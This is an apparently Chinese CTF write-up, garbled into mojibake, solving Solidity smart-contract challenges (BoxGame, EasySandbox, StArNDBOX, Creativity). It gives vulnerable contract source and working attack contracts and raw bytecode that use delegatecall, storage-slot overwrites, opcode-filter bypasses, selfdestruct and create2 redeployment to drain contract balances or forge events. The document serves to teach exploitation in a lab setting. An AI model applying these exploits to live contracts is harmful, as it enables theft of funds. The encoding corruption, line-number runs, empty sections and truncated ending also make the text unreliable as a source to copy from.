0xff)ï¼Œä½¿ç”¨ä¸Šé¢çš„bytecodeéƒ¨ç½²æ”»å‡»åˆçº¦åï¼Œå°†å…¶åœ°å€ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨é¢˜ç›®åˆçº¦çš„payforflagå‡½æ•°ï¼Œå³å¯è§¦å‘ForFlagäº‹ä»¶ã€‚ 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031323334// create bytecodecontract BoxGameHacker &#123; function() external &#123; address owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; // bytes32 eventHash = keccak256(abi.encodePacked(&quot;ForFlag(address)&quot;)); bytes32 eventHash = 0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e2; uint v = 0x100000000000000000000000000000000001000000000000000000; assembly &#123; mstore(0x80, owner) log1(0x80, 0x20, add(eventHash, v)) &#125; &#125;&#125;// deploy contractcontract Deployer &#123; function deploy(uint salt) external returns(address) &#123; bytes32 _salt = keccak256(abi.encodePacked(salt)); bytes memory bytecode = hex&quot;6080604052348015600f57600080fd5b50608280601d6000396000f3fe6080604052348015600f57600080fd5b50600073ab8483f64d9c6d1ecf9b849ae677dd3315835cb2905060007f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9e260001b905060007a10000000000000000000000000000000000100000000000000000090508260805280820160206080a150505000fea265627a7a723158204625f66260f1fdaf525f42f693a093d7d82bc23c20de4f2d6993a2391b1a2bcf64736f6c63430005110032&quot;; address hacker; assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), _salt) &#125; return hacker; &#125;&#125; æˆåŠŸè§¦å‘ForFlag EasySandbox1. questionæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364pragma solidity ^0.5.10;contract EasySandbox &#123; uint256[] public writes; mapping(address =&gt; address[]) public sons; address public owner; uint randomNumber = 0; constructor() public payable &#123; owner = msg.sender; sons[msg.sender].push(msg.sender); writes.length -= 1; &#125; function given_gift(uint256 _what, uint256 _where) public &#123; if(_where != 0xd6f21326ab749d5729fcba5677c79037b459436ab7bff709c9d06ce9f10c1a9f) &#123; writes[_where] = _what; &#125; &#125; function easy_sandbox(address _addr) public payable &#123; require(sons[owner][0] == owner); require(writes.length != 0); bool mark = false; for(uint256 i = 0; i &lt; sons[owner].length; i++) &#123; if(msg.sender == sons[owner][i]) &#123; mark = true; &#125; &#125; require(mark); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); require(writes.length == 0); require(sons[owner].length == 1 &amp;&amp; sons[owner][0] == tx.origin); &#125; // patch function isSolved() public view returns (bool) &#123; return address(this).balance == 0; &#125;&#125; å°†åˆçº¦ä¸­çš„é’±ç›—å–ã€‚ 2. analysis å‰ç½®çŸ¥è¯†ï¼šåœ¨delegatecallä¸­ï¼Œlogicåˆçº¦çš„æ•°æ®ä¸ä¼šæ”¹å˜ï¼Œæ”¹å˜çš„æ˜¯proxyåˆçº¦ä¸­çš„æ•°æ®ï¼Œaddress(this).banlanceåŒæ ·å¦‚æ­¤ï¼Œæ‰€ä»¥æœ¬é¢˜å¯ä»¥é€šè¿‡(success, _) = _addr.delegatecall(&quot;&quot;);è¿™æ¡è¯­å¥ï¼Œå°†EasySandboxåˆçº¦çš„é’±æç©ºã€‚ åˆ†æeasy_sandboxå‡½æ•°ï¼Œå‰ä¸¤ä¸ªæ–­è¨€ä¸éœ€è¦ä¸éœ€è¦åŠ¨è„‘ç»ï¼Œçœ‹åˆ°ç¬¬ä¸‰ä¸ªæ–­è¨€ï¼Œéœ€è¦å°†msg.senderåŠ å…¥åˆ°sons[owner][i]ä¸­ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡writes[]æ•°ç»„è¿›è¡Œè¦†ç›–ï¼Œåˆå§‹åŒ–çš„æ—¶å€™è¯¥æ•°ç»„é•¿åº¦è¢«è®¾ç½®ä¸ºtype(uint).maxï¼Œgiven_gift()å‡½æ•°ä¸ºè¦†ç›–æä¾›å¯è¡Œæ€§ã€‚ æ‰€ä»¥è¦è®¡ç®—å‡ºï¼Œsons[owner]æ‰€å¯¹åº”åŠ¨æ€æ•°ç»„é•¿åº¦çš„æ‰€åœ¨ç´¢å¼•ï¼Œä»¥åŠï¼Œsons[owner][1]æ‰€åœ¨çš„ç´¢å¼•ã€‚è®¡ç®—æ€è·¯å¦‚ä¸‹ï¼š 1234567# cal index of sons[owner].lengthslot_length = keccak256(owner,1) idx_length = slot_length - keccak256(0)# cal index of sons[owner][0]slot_Arr_0 = keccak256(keccak256(owner,1))idx_Arr_0 = slot_Arr_0 - keccak256(0) çœ‹åˆ°ï¼Œå¦‚ä¸‹ä»£ç  1234567assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size)&#125; å¾ˆç†Ÿæ‚‰ï¼Œæ„æ€å°±æ˜¯å°†_addrçš„runtimecodeæ‹·è´ä¸‹æ¥ï¼Œå°†å…¶èµ‹å€¼ç»™codeï¼Œæ¥ä¸‹æ¥å¾ªç¯è¯­å¥å’Œä¸Šä¸€é¢˜å¾ˆç±»ä¼¼ï¼Œå³ä¸èƒ½å‡ºç°0xf0 0xf1 0xf2 0xf4 0xfa 0xffï¼Œè¿™å¾ˆå¯èƒ½éœ€è¦ç¼–è¾‘bytecodeï¼Œç„¶åé€šè¿‡create2åˆ›å»ºåˆçº¦ã€‚ å¾€ä¸‹åˆ†ææœ€åçš„ä¸‰ä¸ªæ–­è¨€ï¼Œå¯å¾—åˆ°çš„æƒ³æ³•ä¸º 1234567/* 1. hackeråˆçº¦çš„é€»è¾‘å¤„ç†éœ€è¦åœ¨å›è°ƒå‡½æ•°ä¸­å®Œæˆï¼› 2. ç¡®ä¿åˆçº¦æˆåŠŸè°ƒç”¨ï¼› 3. ä¿®æ”¹writes.lengthï¼Œè¯¥å€¼ä½äºslot0, sstore(0,0)å°±okäº†ï¼› 4. ä¿®æ”¹sons[owner]å¯¹åº”åŠ¨æ€æ•°ç»„çš„é•¿åº¦ä¸º1ï¼Œsstore(keccak256(owner||1),1) 5. è€—å°½address(this).banlance --&gt; create2 */ æŒ‰è¦æ±‚å¯å¾—åˆ°æ”»å‡»åˆçº¦å¦‚ä¸‹ 123456789101112131415161718192021222324contract EasySandboxHelper &#123; function() external &#123; assembly &#123; // set writes.length == 0 sstore(0, 0) // set sons[owner].length = 1 let idx_sons_owner_length := 0x9d4d959825f0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 sstore(idx_sons_owner_length, 1) // set sons[owner][0] == tx.origin let idx_sons_owner_0 := 0x94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c9 //ff is 32 f8 sstore(idx_sons_owner_0, origin()) // exhaust address(this).balance mstore(0x200, shl(239, shl(1, add(0x32FE,0x1)))) let hacker := create2(selfbalance(), 0x200, 2, 0) &#125; &#125;&#125; æˆ‘æ˜¯åœ¨å¤ç°ï¼Œæ‰€ä»¥é¢˜ä¸­éƒ¨ç½²çš„owneræ˜¯0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2ï¼Œå¯¹å…¶è¿›è¡Œkeccak256(owner,1) è®¡ç®—æ—¶ï¼Œå‡ºç°äº†F0ï¼Œæ‰€ä»¥è¦å¯¹å…¶è¿›è¡Œç›¸åŠ  123let idx_sons_owner_length := 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4let tem := 0x100000000000000000000000000000000000000000000000000000sstore(add(idx_sons_owner_length, tem), 1) å‰é¢å‡ ä¸ªä¿®æ”¹å€¼è¿˜æ˜¯å¾ˆå®¹æ˜“å®ç°çš„ï¼Œæœ‰è¶£çš„æ˜¯ï¼Œå¦‚ä½•å°†åˆçº¦çš„é’±æç©ºï¼Œæˆ‘æœ€å¼€å§‹æƒ³åˆ°çš„æ˜¯ä½¿ç”¨callï¼Œä½†æ˜¯å¥½å¥‡ä¸å·§ï¼Œcallçš„åºå·ä¸ºF1ï¼Œéšåçœ‹åˆ°å¤§ä½¬çš„é¢˜è§£ï¼Œé‡‡ç”¨äº†create2ï¼ŒåŒæ—¶è¿˜å°†åˆçº¦çš„é’±è½¬å›äº†è‡ªå·±çš„è´¦æˆ·ï¼Œæˆ‘ç›´æ¥çœ‹å‘†äº†ï¼Œåé¢ä»”ç»†åˆ†æï¼Œæœ€åå€Ÿé‰´äº†è¿™æ³¢æ“ä½œã€‚ 123// exhaust address(this).balancemstore(0x200, shl(239, shl(1, add(0x32FE,0x1))))let hacker := create2(selfbalance(), 0x200, 2, 0) ğŸ“Œç»†å“ ä½¿ç”¨0x32FFè¿™ä¸¤ä¸ªå­—èŠ‚ä½œä¸ºbytcodeåˆ›å»ºåˆçº¦ï¼Œå…¶å«ä¹‰ä¸ºselfdestruct(tx.origin)ï¼Œæˆ‘ç¬¬ä¸€æ¬¡è§è¿˜å¯ä»¥è¿™æ ·åˆ›å»ºåˆçº¦çš„ï¼Œç›´æ¥è‡ªæ¯ï¼Œåˆç”±äºFFè¢«ç¦æ­¢ä½¿ç”¨ï¼Œæ‰€ä»¥é‡‡ç”¨äº†add(0x32FE,0x1)ï¼Œéšåå°†0x32FFç§»åŠ¨åˆ°32bytesçš„é«˜16ä½ã€‚ 12345/* å·¦ç§»240ä½çš„åŸå› ï¼š å¯¹äºä¸€æ®µbytecodeï¼ŒEVMçš„è¯»å–æ–¹å¼ä¸ºä»å·¦åˆ°å³ï¼Œå³ä»é«˜ä½åˆ°ä½ä½ï¼Œ mstore(offset, value) å­˜å‚¨æ–¹å¼ä¸ºä½ä½å­˜å‚¨ï¼Œé«˜ä½ç•™ç©ºï¼Œä¸”å­˜å‚¨çš„å¤§å°ä¸º32byteså³256ä½ï¼Œ0x32FFå äº†4*4=16(bit)ï¼Œæ‰€ä»¥éœ€è¦å·¦ç§» 32bytes(256bit) - 16bit = 240(0XF0)bit */ æœ€åï¼Œå¦‚æœåœ¨metadataéƒ¨åˆ†å‡ºç°äº†è¢«é™åˆ¶çš„å­—èŠ‚ï¼Œå¯ä»¥åƒBoxGameé‚£æ ·ï¼Œä¿®æ”¹returnçš„å­—èŠ‚é•¿åº¦ã€‚å°†æœ€ç»ˆçš„bytecodeé€šè¿‡create2åˆ›å»ºå‡ºæ¥å³å¯ç”¨æ¥å®Œæˆpwnã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192/* realize fallback */contract EasySandboxHelper &#123; function() external &#123; assembly &#123; // set writes.length == 0 sstore(0, 0) // set sons[owner].length = 1 /* set owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 destination = 0x9d4d959825f0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 = 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 + 0x100000000000000000000000000000000000000000000000000000 */ let idx_sons_owner_length := 0x9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a4 let tem := 0x100000000000000000000000000000000000000000000000000000 sstore(add(idx_sons_owner_length, tem), 1) // set sons[owner][0] == tx.origin let idx_sons_owner_0 := 0x94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c9 //ff is 32 f8 sstore(idx_sons_owner_0, origin()) // exhaust address(this).balance mstore(0x200, shl(239, shl(1, add(0x32FE,0x1)))) let hacker := create2(selfbalance(), 0x200, 2, 0) &#125; &#125;&#125;/* realize attack*/contract EasySandboxHacker &#123; EasySandbox box; Calculation cal; address helper; constructor(address _box) public &#123; box = EasySandbox(_box); cal = new Calculation(); bytes memory bytecode = hex&quot;6080604052348015600f57600080fd5b50609a8061001e6000396000f3fe6080604052348015600f57600080fd5b50600080557f9d4d959825e0680278e64197773b2a50cd78b2b2cb00711ddbeebf0bf93cd8a47a1000000000000000000000000000000000000000000000000000006001818301557f94b29c01ed483e694a7ecf386d384987d4d3e9d4e6c476f5b97302b23ff871c932815560016132fe0160011b60ef1b610200526000600261020047f55050505000fea265627a7a7231582023a73df8d65ef946e0bdd1fb3d5b829c0dcaa1a4e38382baac32981b896977f464736f6c63430005110032&quot;; address addr; assembly &#123; addr := create2(0, add(bytecode, 0x20), mload(bytecode), 0) &#125; helper = addr; &#125; function pwn() public &#123; // First, get owner address box_owner = box.owner(); // 1. set sons[owner].length = 2 uint idx1 = uint(cal.calIdxOf_Arr(box_owner)) - uint(keccak256(abi.encodePacked(uint(0)))); box.given_gift(2, idx1); // 2. set sons[owner][1] = msg.sender uint idx2 = uint(cal.calArr0(box_owner)) - uint(keccak256(abi.encodePacked(uint(0)))); box.given_gift(uint(address(this)), idx2 + 1); console.log(&quot;given_gift2&quot;); // 3. call easy_sandbox() to exhaust the balance box.easy_sandbox(address(helper)); // 4. determine is not solving require(box.isSolved(), &quot;You don&#x27;t solve the challenge...&quot;); &#125;&#125;/*calculation*/contract Calculation &#123; // è®¡ç®— owner =&gt; address[] æ•°ç»„é•¿åº¦æ‰€åœ¨çš„ä½ç½® function calIdxOf_Arr(address owner) public returns(bytes32) &#123; return keccak256(abi.encode(owner, uint(1))); &#125; // è®¡ç®— address[0]æ‰€åœ¨ä½ç½® function calArr0(address owner) public returns (bytes32) &#123; return keccak256(abi.encodePacked(calIdxOf_Arr(owner))); &#125; &#125; StArNDBOX1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138pragma solidity ^0.5.11;library Math &#123; function invMod(int256 _x, int256 _pp) internal pure returns (int) &#123; int u3 = _x; int v3 = _pp; int u1 = 1; int v1 = 0; int q = 0; while (v3 &gt; 0)&#123; q = u3/v3; u1= v1; v1 = u1 - v1*q; u3 = v3; v3 = u3 - v3*q; &#125; while (u1&lt;0)&#123; u1 += _pp; &#125; return u1; &#125; function expMod(int base, int pow,int mod) internal pure returns (int res)&#123; res = 1; if(mod &gt; 0)&#123; base = base % mod; for (; pow != 0; pow &gt;&gt;= 1) &#123; if (pow &amp; 1 == 1) &#123; res = (base * res) % mod; &#125; base = (base * base) % mod; &#125; &#125; return res; &#125; function pow_mod(int base, int pow, int mod) internal pure returns (int res) &#123; if (pow &gt;= 0) &#123; return expMod(base,pow,mod); &#125; else &#123; int inv = invMod(base,mod); return expMod(inv,abs(pow),mod); &#125; &#125; function isPrime(int n) internal pure returns (bool) &#123; if (n == 2 ||n == 3 || n == 5) &#123; return true; &#125; else if (n % 2 ==0 &amp;&amp; n &gt; 1 )&#123; return false; &#125; else &#123; int d = n - 1; int s = 0; while (d &amp; 1 != 1 &amp;&amp; d != 0) &#123; d &gt;&gt;= 1; ++s; &#125; int a=2; int xPre; int j; int x = pow_mod(a, d, n); if (x == 1 || x == (n - 1)) &#123; return true; &#125; else &#123; for (j = 0; j &lt; s; ++j) &#123; xPre = x; x = pow_mod(x, 2, n); if (x == n-1)&#123; return true; &#125;else if(x == 1)&#123; return false; &#125; &#125; &#125; return false; &#125; &#125; function gcd(int a, int b) internal pure returns (int) &#123; int t = 0; if (a &lt; b) &#123; t = a; a = b; b = t; &#125; while (b != 0) &#123; t = b; b = a % b; a = t; &#125; return a; &#125; function abs(int num) internal pure returns (int) &#123; if (num &gt;= 0) &#123; return num; &#125; else &#123; return (0 - num); &#125; &#125; &#125;contract StArNDBOX&#123; using Math for int; constructor()public payable&#123; &#125; modifier StAr() &#123; require(msg.sender != tx.origin); _; &#125; function StArNDBoX(address _addr) public payable&#123; uint256 size; bytes memory code; int res; assembly&#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; res = int(uint8(code[i])); require(res.isPrime() == true); &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); &#125; // patch function isSolved() public view returns (bool) &#123; return address(this).balance == 0; &#125;&#125; ğŸ“Œ ç›®æ ‡ï¼šå°†åˆçº¦çš„é’±æç©º 2. analysis å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯è¦é€šè¿‡delegatecallå°†åˆçº¦çš„ä½™é¢æç©ºï¼Œä½†æ˜¯è¦æ±‚_addrçš„runtimecodeçš„å­—èŠ‚å…¨æ˜¯è´¨æ•°ï¼Œè€Œè´¨æ•°çš„é™åˆ¶å¤ªå¤šäº†ï¼Œå¯ä»¥æ„é€ runtimeå­—èŠ‚ç ï¼Œå’ŒBoxGameæœ‰ç‚¹ç±»ä¼¼ï¼Œåœ¨constructorä¸­è¿”å›å³å¯ã€‚è€Œruntimecodeè¢«éƒ¨ç½²åˆ°é“¾ä¸Šï¼Œæ˜¯å¯ä»¥è¢«è°ƒç”¨çš„é€»è¾‘ï¼Œåªè¦å°†runtimecodeçš„è®¾ç½®ä¸ºå°†æœ¬åˆçº¦çš„balanceå…¨éƒ¨è½¬èµ°å³å¯ã€‚æœ€æœ‰ç”¨çš„ä¸¤ä¸ªopcodeå°±æ˜¯push2ï¼ˆ0x61ï¼‰ä»¥åŠcallï¼ˆ0xf1ï¼‰ 123456789/* call(g, a, v, in, insize, out, outsize) // gæ˜¯å¯ç”¨çš„gasæ•°é‡ï¼Œaæ˜¯è¦è°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œvæ˜¯è¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œinæ˜¯è¦å‘é€çš„è°ƒç”¨æ•°æ®ï¼Œ // insizeæ˜¯è°ƒç”¨æ•°æ®çš„é•¿åº¦ï¼Œoutæ˜¯ä¸€ä¸ªæŒ‡å‘è¾“å‡ºç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œoutsizeæ˜¯è¾“å‡ºç¼“å†²åŒºçš„å¤§å° // å…¥æ ˆçš„é¡ºåºä¸ºï¼š outsize -&gt; out -&gt; insize -&gt; in -&gt; v -&gt; a -&gt; g -&gt; call // msg.sender(0x33), tx.origin(0x32) is not prime // set value =&gt; outsize=0, out=0, insize=0, in=0, v=0x47(SELFBALANCE()), a=address(0), gas=FBFB // push1(0x60) is not prime, push2(0x61) is prime*/ å°†ä¸Šè¿°æ“ä½œæ¢åšopcdeä¸º 12345678// PUSH2 0000 610000 // outsize// PUSH2 0000 610000 // out// PUSH2 0000 610000 // insize// PUSH2 0000 610000 // in// selfbalance() 47 47 // value// PUSH2 0000 610000 // address// PUSH2 FBFB 61FBFB// gas// CALL F1 F1 // opcode runtimecodeä¸ºï¼š 10x6100006100006100006100004761000061FBFBF1 3. solveæ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152contract StArNDBOXHacker &#123; StArNDBOX box; constructor(address _box) public &#123; box = StArNDBOX(_box); &#125; function pwn() external &#123; // steal the balance of box box.StArNDBoX(address(new StArNDBOXHelper())); // slove require(box.isSolved(), &quot;You don&#x27;t solve the challenge...&quot;); &#125;&#125;contract StArNDBOXHelper &#123; constructor() public &#123; /* call(g, a, v, in, insize, out, outsize) =&gt; exhaust the money // gæ˜¯å¯ç”¨çš„gasæ•°é‡ï¼Œaæ˜¯è¦è°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œvæ˜¯è¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œinæ˜¯è¦å‘é€çš„è°ƒç”¨æ•°æ®ï¼Œ // insizeæ˜¯è°ƒç”¨æ•°æ®çš„é•¿åº¦ï¼Œoutæ˜¯ä¸€ä¸ªæŒ‡å‘è¾“å‡ºç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œoutsizeæ˜¯è¾“å‡ºç¼“å†²åŒºçš„å¤§å° // å…¥æ ˆçš„é¡ºåºä¸ºï¼š outsize -&gt; out -&gt; insize -&gt; v -&gt; a -&gt; g -&gt; call // msg.sender(0x33), tx.origin(0x32) is not prime // set value =&gt; outsize=0, out=0, insize=0, v=0x47(SELFBALANCE()), a=address(0), gas= // push1(0x60) is not prime, push2(0x61) is prime // PUSH2 0000 610000 // outsize // PUSH2 0000 610000 // out // PUSH2 0000 610000 // insize // PUSH2 0000 610000 // in // selfbalance() 47 47 // value // PUSH2 0000 610000 // address // PUSH2 FBFB 61FBFB// gas // CALL F1 F1 // opcode */ bytes memory runtimecode = hex&quot;6100006100006100006100004761000061FBFBF1&quot;; assembly &#123; return(add(runtimecode, 0x20), mload(runtimecode)) &#125; &#125;&#125; AcoraidaMonica1. questionæºç  1234567891011121314151617```&gt; ### 2. analysis&gt; ### 3. solve## Re-Montagy### 1. question**æºç **```solidity 2. analysis 3. solveCreativity1. questionæºç  1234567891011121314151617181920212223242526pragma solidity ^0.5.10;contract Creativity &#123; event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function execute() public &#123; require(target != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(address(0)); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); &#125;&#125; è§¦å‘SendFlagäº‹ä»¶ 2. analysis è¿™é¢˜æœ‰ç‚¹ç±»ä¼¼ï¼šEKOçš„ phoenixttoï¼ŒåŸç†æ˜¯ç›¸åŒçš„åˆçº¦åœ°å€ï¼Œå…·æœ‰ä¸åŒçš„é€»è¾‘åŠŸèƒ½ã€‚ å“ï¼Œç¦»è°±å¾—å¾ˆã€‚ åˆ†æï¼šè¦è§¦å‘SendFlagäº‹ä»¶ï¼Œæ˜¾ç„¶éœ€è¦é€šè¿‡executeå‡½æ•°ï¼Œè¯¥å‡½æ•°é€šè¿‡delegatecallè°ƒç”¨targetã€‚è€Œtargetéœ€è¦é€šè¿‡checkè®¾ç½®ï¼Œé™åˆ¶äº†åˆçº¦ä»£ç é•¿åº¦ä¸è¶…è¿‡4ä¸ªå­—èŠ‚ã€‚ä½†æ˜¯4ä¸ªå­—èŠ‚æ˜¾ç„¶ä¸èƒ½å®ç°è§¦å‘äº‹ä»¶çš„åŠŸèƒ½ï¼Œè¿™é‡Œæ˜¯çœ‹å¤§ä½¬çš„é¢˜è§£ è¿™é‡Œä½¿ç”¨create2çš„ä¸€ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥è®©ä¸åŒçš„å­—èŠ‚ç éƒ¨ç½²åˆ°åŒä¸€ä¸ªåœ°å€ã€‚å¯ä»¥å…ˆéƒ¨ç½²ä¸€ä¸ªåªå…·æœ‰è‡ªæ¯åŠŸèƒ½çš„åˆçº¦ï¼Œå³åªå…·å¤‡å››ä¸ªå­—èŠ‚(0x32FF)selfdestrct(tx.origin)è¿™æ ·ä¸€æ¥å°±å¯ä»¥é€šè¿‡checkå°†å‚æ•°èµ‹å€¼ç»™targetï¼Œè¿”å›é€šè¿‡ä½çº§è°ƒç”¨ï¼Œè®©è¯¥åˆçº¦è‡ªæ¯ï¼ˆä¿è¯create2æ­£å¸¸æ‰§è¡Œï¼‰ï¼Œæœ€åé€šè¿‡create2åœ¨åŒä¸€ä¸ªåœ°å€åˆ›å»ºè§¦å‘SendFlagäº‹ä»¶çš„åˆçº¦ï¼Œåœ¨æ‰§è¡Œexecuteå‡½æ•°å³å¯ã€‚ å®ç°åŒä¸€åœ°å€ï¼Œå…·æœ‰ä¸åŒåŠŸèƒ½çš„ä»£ç ï¼ˆå€Ÿé‰´å¤§ä½¬çš„ï¼‰ 123456789101112131415161718192021222324contract Deployer &#123; bytes public deployBytecode; // code is Logic contract&#x27;s bytecode function deploy(bytes memory code) public returns(address addr) &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = type().creationCode; assembly &#123; addr := create2(callvalue(), add(0x20, dumperBytecode), mload(dumperBytecode), 0x1030) &#125; &#125;&#125;contract Dumper &#123; constructor() &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; æ³¨æ„ï¼š_addréƒ½æ˜¯é€šè¿‡Deployeråˆçº¦åˆ›å»ºçš„ï¼Œè€Œä¸”è°ƒç”¨deployå‡½æ•°çš„ä¸¤æ¬¡ä¼ å‚åˆ†åˆ«æ˜¯å…·æœ‰è‡ªæ¯åŠŸèƒ½çš„ è¿™é‡Œæˆ‘å‘ç°äº†ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ä¸œè¥¿ï¼Œä¸ºä»€ä¹ˆæŠŠä¸¤æ­¥create2æ“ä½œå’Œç©ºè°ƒç”¨æ”¾åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­ä¸è¡Œï¼ˆcall(â€œâ€)ä¼šå¤±è´¥ï¼Œå³æ— æ³•å°†åˆçº¦å›è°ƒï¼‰ï¼Œè‡³ä»Šè¿˜æ²¡ææ‡‚ï¼Œåªæœ‰å°†ä»–ä»¬åˆ†å¼€æ‰å¯ä»¥hackæˆåŠŸã€‚é”™è¯¯ä»£ç ï¼š 123456789101112131415161718function pwn() external &#123; // 1. deploy selfdestruct contract bytes memory destructCode = hex&quot;32FF&quot;; // selfdestruct(tx.origin) address destruct_addr = deployer.deploy(destructCode); // 2. set target = destuct_addr creativity.check(destruct_addr); // 3. destruct the contract destruct_addr.call(&quot;&quot;); // 4. deploy sendflag contract deployer.deploy(type(CreativitySendFlag).runtimeCode); // 5. emit the SendFlag creativity.execute();&#125; å°†ä»–ä»¬ä¸‰æ‹†å¼€æ‰èƒ½æˆåŠŸã€‚ 3. solveæ”»å‡»åˆçº¦ &#x3D;&#x3D;&gt; æ”»å‡»é€»è¾‘ï¼šéƒ¨ç½²Hackeråˆçº¦ï¼Œä¾æ¬¡æ‰§è¡Œpwn1()ï¼Œpwn2()ï¼Œpwn3() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192// selfdestruct(tx.origin)contract CreativityDestruct &#123; constructor() public &#123; assembly &#123; mstore(0x200, shl(240, 0x32FF)) return (0x200, 4) &#125; &#125;&#125;// emit SendFlagcontract CreativitySendFlag &#123; function() external &#123; bytes32 eventHash = keccak256(abi.encodePacked(&quot;SendFlag(address)&quot;)); address hacker = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2; assembly &#123; mstore(0x200, hacker) log1(0x200, 0x20, eventHash) &#125; &#125;&#125;// be responsible for creating contractcontract Deployer &#123; bytes public deployBytecode; // code is Logic contract&#x27;s bytecode function deploy(bytes memory code) public returns(address addr) &#123; deployBytecode = code; // Compile Dumper to get this bytecode bytes memory dumperBytecode = type(Dumper).creationCode; assembly &#123; addr := create2(0, add(0x20, dumperBytecode), mload(dumperBytecode), 0x1030) &#125; &#125;&#125;// the function is assigning different functionscontract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125;contract CreativityHacker &#123; Creativity creativity; Deployer deployer; constructor(address _creativity) public &#123; creativity = Creativity(_creativity); deployer = new Deployer(); &#125; address addr; function pwn1() external &#123; // 1. deploy selfdestruct contract bytes memory destructCode = hex&quot;32FF&quot;; addr = deployer.deploy(destructCode); // 2. set target = destuct_addr creativity.check(addr); &#125; function pwn2() external &#123; // 3. destruct the contract addr.call(&quot;&quot;); &#125; function pwn3() external &#123; // 4. deploy sendflag contract deployer.deploy(type(CreativitySendFlag).runtimeCode); // 5. emit the SendFlag creativity.execute(); &#125;&#125; æ€»ç»“ BoxGame çŸ¥é“äº†æ±‡ç¼–log1çš„ç”¨æ³•ï¼Œä»¥åŠåŠ æ·±äº†å¯¹bytecodeçš„è®¤çŸ¥ï¼Œmetadataçš„æœ‰æ— ä¸å½±å“åˆçº¦çš„éƒ¨ç½²ã€‚ EasySandbox åœ¨è¿™é¢˜ä¸­ï¼Œæˆ‘çŸ¥é“äº†delegatecallçš„å¦ä¸€ä¸ªç‰¹ç‚¹ï¼Œé€»è¾‘åˆçº¦çš„è½¬è´¦æ“ä½œï¼Œåœ¨ä»£ç†åˆçº¦ä¸­é€šè¿‡delegatecallè°ƒç”¨ï¼Œå®é™…ä¸Šæ“ä½œçš„æ˜¯ä»£ç†åˆçº¦ä¸­çš„ä½™é¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š é¦–å…ˆï¼Œåœ¨éƒ¨ç½²proxyæ—¶ï¼Œå·²ç»ç»™proxyè½¬äº†1ether ç»“æœæ˜¾ç¤ºï¼Œæ‰§è¡Œå®Œdelegatecallå‡½æ•°ä¹‹åï¼Œproxyä¸­çš„é’±è¢«è½¬èµ°äº†ã€‚ 123// exhaust address(this).balancemstore(0x200, shl(239, 